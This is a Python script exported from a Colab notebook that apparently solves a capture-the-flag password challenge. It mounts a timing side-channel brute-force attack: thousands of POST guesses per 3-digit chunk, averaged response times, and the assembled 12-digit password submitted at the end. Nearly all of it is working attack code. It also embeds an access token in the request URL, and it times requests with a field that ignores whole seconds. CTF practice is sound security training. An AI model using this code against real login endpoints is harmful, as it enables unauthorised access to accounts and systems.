# -*- coding: utf-8 -*-
"""CTF4 - average.ipynb

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1xhRF70ZGJhqvv-Y4RztXCPAhs7xABsqq
"""

# Runs 26 iterations per chunk (000-999), stores server response time for 
# each 3-digit combination, then returns the 3-digit combination with highest
# average server response time. The candidate chunk is prepended for next 
# iteration until iterations and averaging for all four chunks are completed. 
# The candidate password is assembled and submitted to CTF system. 

import requests

url = "https://w210.network/api/challenges/PasswordDB?token=jason.1fgIg2aA3CgbsIxhSaJxxgST51k"

chunk_one_list = [dict() for k in range(27)]
for x in range(26):
    
    for i in range(0, 1000): 
        chunk = f'{i:03}'
        chunk_one_password = chunk + '000000000'
        data = {"password": chunk_one_password}
        request = requests.post(url, data = data)
        time = request.elapsed.microseconds
        chunk_one_list[x][int(chunk)] = time

for j in range(0, 1000):
    chunk_one_list[26][j] = int((chunk_one_list[0][j] + chunk_one_list[1][j] + 
                                chunk_one_list[2][j] + chunk_one_list[3][j] +
                                chunk_one_list[4][j] + chunk_one_list[5][j] +
                                chunk_one_list[6][j] + chunk_one_list[7][j] +
                                chunk_one_list[8][j] + chunk_one_list[9][j] +
                                chunk_one_list[10][j] + chunk_one_list[11][j] +
                                chunk_one_list[12][j] + chunk_one_list[13][j] +
                                chunk_one_list[14][j] + chunk_one_list[15][j] +
                                chunk_one_list[16][j] + chunk_one_list[17][j] +
                                chunk_one_list[18][j] + chunk_one_list[19][j] +
                                chunk_one_list[20][j] + chunk_one_list[21][j] +
                                chunk_one_list[22][j] + chunk_one_list[23][j] +
                                chunk_one_list[24][j] + chunk_one_list[25][j]) / 26)
    
result_one = max(chunk_one_list[26], key = chunk_one_list[26].get)
chunk_one = f'{result_one:03}'
print("Chunk one:", chunk_one)

### Chunk 2 ###
chunk_two_list = [dict() for k in range(27)]
for x in range(26):
    
    for i in range(0, 1000):
        chunk = f'{i:03}'
        chunk_two_password = chunk_one + chunk + '000000'
        data = {"password": chunk_two_password}
        request = requests.post(url, data = data)
        time = request.elapsed.microseconds
        chunk_two_list[x][int(chunk)] = time

for j in range(0, 1000):
    chunk_two_list[26][j] = int((chunk_two_list[0][j] + chunk_two_list[1][j] + 
                                chunk_two_list[2][j] + chunk_two_list[3][j] +
                                chunk_two_list[4][j] + chunk_two_list[5][j] +
                                chunk_two_list[6][j] + chunk_two_list[7][j] +
                                chunk_two_list[8][j] + chunk_two_list[9][j] +
                                chunk_two_list[10][j] + chunk_two_list[11][j] +
                                chunk_two_list[12][j] + chunk_two_list[13][j] +
                                chunk_two_list[14][j] + chunk_two_list[15][j] +
                                chunk_two_list[16][j] + chunk_two_list[17][j] +
                                chunk_two_list[18][j] + chunk_two_list[19][j] +
                                chunk_two_list[20][j] + chunk_two_list[21][j] +
                                chunk_two_list[22][j] + chunk_two_list[23][j] +
                                chunk_two_list[24][j] + chunk_two_list[25][j]) / 26)

result_two = max(chunk_two_list[26], key = chunk_two_list[26].get)
chunk_two = f'{result_two:03}'
print("Chunk two:", chunk_two)

### Chunk 3 ###
chunk_three_list = [dict() for k in range(27)]
for x in range(26):
    
    for i in range(0, 1000):
        chunk = f'{i:03}'
        chunk_three_password = chunk_one + chunk_two + chunk + '000'
        data = {"password": chunk_three_password}
        request = requests.post(url, data = data)
        time = request.elapsed.microseconds
        chunk_three_list[x][int(chunk)] = time

for j in range(0, 1000):
    chunk_three_list[26][j] = int((chunk_three_list[0][j] + chunk_three_list[1][j] + 
                                chunk_three_list[2][j] + chunk_three_list[3][j] +
                                chunk_three_list[4][j] + chunk_three_list[5][j] +
                                chunk_three_list[6][j] + chunk_three_list[7][j] +
                                chunk_three_list[8][j] + chunk_three_list[9][j] +
                                chunk_three_list[10][j] + chunk_three_list[11][j] +
                                chunk_three_list[12][j] + chunk_three_list[13][j] +
                                chunk_three_list[14][j] + chunk_three_list[15][j] +
                                chunk_three_list[16][j] + chunk_three_list[17][j] +
                                chunk_three_list[18][j] + chunk_three_list[19][j] +
                                chunk_three_list[20][j] + chunk_three_list[21][j] +
                                chunk_three_list[22][j] + chunk_three_list[23][j] +
                                chunk_three_list[24][j] + chunk_three_list[25][j]) / 26)

result_three = max(chunk_three_list[26], key = chunk_three_list[26].get)
chunk_three = f'{result_three:03}'
print("Chunk three:", chunk_three)

### Chunk 4 ###
chunk_four_list = [dict() for k in range(27)]
for x in range(26):
    
    for i in range(0, 1000):
        chunk = f'{i:03}'
        chunk_four_password = chunk_one + chunk_two + chunk_three + chunk
        data = {"password": chunk_four_password}
        request = requests.post(url, data = data)
        time = request.elapsed.microseconds
        chunk_four_list[x][int(chunk)] = time

for j in range(0, 1000):
    chunk_four_list[26][j] = int((chunk_four_list[0][j] + chunk_four_list[1][j] + 
                                chunk_four_list[2][j] + chunk_four_list[3][j] +
                                chunk_four_list[4][j] + chunk_four_list[5][j] +
                                chunk_four_list[6][j] + chunk_four_list[7][j] +
                                chunk_four_list[8][j] + chunk_four_list[9][j] +
                                chunk_four_list[10][j] + chunk_four_list[11][j] +
                                chunk_four_list[12][j] + chunk_four_list[13][j] +
                                chunk_four_list[14][j] + chunk_four_list[15][j] +
                                chunk_four_list[16][j] + chunk_four_list[17][j] +
                                chunk_four_list[18][j] + chunk_four_list[19][j] +
                                chunk_four_list[20][j] + chunk_four_list[21][j] +
                                chunk_four_list[22][j] + chunk_four_list[23][j] +
                                chunk_four_list[24][j] + chunk_four_list[25][j]) / 26)

result_four = max(chunk_four_list[26], key = chunk_four_list[26].get)
chunk_four = f'{result_four:03}'
print("Chunk four:", chunk_four)

final_password = chunk_one + chunk_two + chunk_three + chunk_four
final_data = {"password": final_password} 
request = requests.post(url, data = final_data)
status = request.status_code
text = request.text

print()
print("Password:", final_password)
print("Status:", status)
print("Text:", text)
print("Completed")